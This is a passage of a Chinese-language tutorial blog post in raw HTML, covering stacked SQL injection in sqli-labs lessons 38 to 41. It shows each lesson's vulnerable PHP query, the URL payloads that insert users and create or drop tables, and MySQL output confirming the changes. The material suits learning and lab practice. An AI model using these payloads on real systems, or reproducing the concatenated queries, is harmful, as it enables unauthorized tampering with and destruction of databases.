style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">LIMIT</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">0</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span><span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">";</span></code></pre></section><pre><span style="font-size:14px;line-height:34px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">（2）测试</span><br  /></pre><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (‘<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">38</span>’,’less38’,’hello’)–+<br  /><br  />mysql&gt; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;</code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| id | username | password   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  1 | Dumb     | Dumb       |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  2 | Angelina | I-kill-you |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  3 | Dummy    | p@ssword   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  4 | secure   | crappy     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  5 | stupid   | stupidity  |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  6 | superman | genious    |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  7 | batman   | mob!le     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  8 | admin    | admin      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  9 | admin1   | admin1     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 10 | admin2| admin2     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 11 | admin3| admin3     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 12 | dhakkan| dumbo      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 14 | admin4| admin4     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 38 | less38| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">14 rows in set (0.00 sec)</span></pre><p><span style="font-size:14px;line-height:34px;;">发现已经添加了一个&nbsp;less38&nbsp;用户</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less38 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;<br  /><br  />?id=1’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less38;</code></pre></section><p><br  /></p><h2><span style="font-size:16px;line-height:36px;;"><strong>2.Less-39 堆叠注入&nbsp;-&nbsp;整型 - GET</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">$sql="<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=$<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">LIMIT</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">0</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span><span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">";</span></code></pre></section><pre>（<span style="font-size:14px;line-height:34px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">2</span><span style="font-size:14px;line-height:34px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">）测试</span><br  /><span style="font-size:14px;line-height:34px;;"></span></pre><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (‘<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">39</span>’,’less39’,’hello’)–-<br  /> <br  /><br  />mysql&gt; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;</code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| id | username | password   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  1 | Dumb     | Dumb       |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  2 | Angelina | I-kill-you |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  3 | Dummy    | p@ssword   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  4 | secure   | crappy     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  5 | stupid   | stupidity  |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  6 | superman | genious    |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  7 | batman   | mob!le     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  8 | admin    | admin      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  9 | admin1   | admin1     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 10 | admin2| admin2     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 11 | admin3| admin3     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 12 | dhakkan| dumbo      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 14 | admin4| admin4     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 38 | less38| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 39 | less39| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">15 rows in set (0.00 sec)</span></pre><p><span style="font-size:14px;line-height:34px;;">可以看到已经添加了&nbsp;less39&nbsp;用户了</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less39 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;<br  /><br  />?id=1;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 32px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less39;</code></pre></section><h2><span style="font-size:16px;line-height:36px;;"><strong>3.Less-40 盲注&nbsp;-&nbsp;堆叠注入 - 字符型 - GET</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">$sql="<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=(<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'$id'</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">LIMIT</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">0</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span><span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">";</span></code></pre></section><pre>（<span style="font-size:14px;line-height:34px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">2）测试</span><br  /><span style="font-size:14px;line-height:34px;;"></span></pre><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1’); <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (‘<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">40</span>’,’less40’,’hello’)–+<br  /> <br  /><br  />mysql&gt; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;</code></pre></section><pre><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| id  | username | password   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   1 | Dumb     | Dumb       |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   2 | Angelina | I-kill-you |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   3 | Dummy    | p@ssword   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   4 | secure   | crappy     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   5 | stupid   | stupidity  |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   6 | superman | genious    |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   7 | batman   | mob!le     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   8 | admin    | admin      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   9 | admin1   | admin1     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  10 | admin2   | admin2     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  11 | admin3   | admin3     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  12 | dhakkan  | dumbo      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  14 | admin4   | admin4     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  38 | less38   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  39 | less39   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 109 | hello| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  40 | less40   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">17 rows in set (0.00 sec)</span></pre><p><span style="font-size:14px;line-height:34px;;">看到添加了&nbsp;less40&nbsp;用户</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1’);<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less40 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;<br  /><br  />?id=1’);<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less40;</code></pre></section><h2><span style="font-size:16px;line-height:36px;;"><strong>4.Less-41 盲注&nbsp;-&nbsp;堆叠注入 - 整型 - GET</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">$sql="<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 14px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>=$<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">LIMIT</span> <span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 7px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">0</span>,<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">1</span><span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">";</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">（2）测试（盲注）</span></p><p><span style="font-size:14px;line-height:34px;;">创建users表和增加字段值</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (‘<span class="hljs-default-number" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">110</span>’,’less41’,’hello’)–+<br  /><br  />mysql&gt; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: 